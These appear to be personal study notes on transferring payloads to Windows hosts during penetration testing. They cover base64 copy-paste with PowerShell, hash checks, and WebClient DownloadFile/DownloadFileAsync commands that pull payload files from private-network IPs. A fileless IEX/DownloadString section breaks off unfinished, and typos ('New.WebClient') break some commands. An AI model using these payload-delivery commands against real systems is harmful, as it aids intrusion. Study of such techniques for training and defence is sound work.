OK lets get started

- [x] COPY AND PASTE METHOD 
1. B64 ENCODE YOUR PAYLOAD
```bash
cat "payload.txt" | base64 -w 0;echo
```
The `-w` disables line wrapping, 0 means off, default is 76. This makes sure the string is one continuous line 
2. INSIDE windos pwsh 
```
[IO.FILE]::WriteAllBytes("C:\\Desktop\\paylaod.txt", 
[Convert]::FromBase64String("SAhsdigbghcjeowgf=="))
```
`[IO.FILE]::WriteAllBytes("path", bytes` coverts the base64 payload into a bytes array 
then we convert they `bytes` from base64 using the `[Convert]::FromBase64String("b64 string")`

The `Get-FileHash` cmdlet can be used to compare the file hashed to make sure the payloads are the same
```
Get-FileHash C:\\Desktop\payload.txt -Algorithm md5
```
In linux the `md5sum` utility slaps too 
```
md5sum payload.txt
```

- [x] POWERSHELL DOWNLOADFILE METHOD
Class name `Net.WebClient` and the `DownlaodFile` method 
- FILE DOWNLOAD 
Standard file download 
```powershell
(New-Object New.WebClient).DownloadFile('http://10.10.10.15:80/payload.txt', 'payload.txt')
```
`DownloadFile` params are the download URL and output name
**(Synchronous)**: The script **pauses and waits** (blocks) at this line until the file is completely downloaded.  No further commands run until the operation succeeds or fails

Asynchronous file download 
```powershell
(New-Object New.WebClient).DownloadFileAsync('http://10.10.10.16:80/payload.txt', 'payload.txt')
```
**(Asynchronous)**: The download starts in the **background** on a separate thread.  The script **immediately proceeds** to the next line of code.  This is useful for downloading large payloads while simultaneously setting up listeners or executing other reconnaissance commands

Because `DownloadFileAsync` returns control immediately, the script may attempt to use the file before it has finished downloading, leading to errors. To use it safely, you must implement a **wait mechanism**:

1. **Event Wait Handle**: The robust method involves creating a `ManualResetEvent` that signals when the `DownloadFileCompleted` event fires. 
    
2. **Polling Loop**: A simpler approach for quick scripts is to loop while the client is busy:
```powershell
$client = New-Object Net.WebClient
$client.DownloadFileAsync('http://target/file.exe', 'file.exe')
while ($client.IsBusy) { Start-Sleep -Seconds 1 }
# File is now ready to use   
```

- [ ] POWERHSLL DOWNLOADSTRING- FILELESS METHOD
THE `Invoke-Expression` or `IEX` cmdlet lets you run scripts directly in memory 
```powershell
$client= New-Object Net.WebClient
$client.DownloadString(") 
```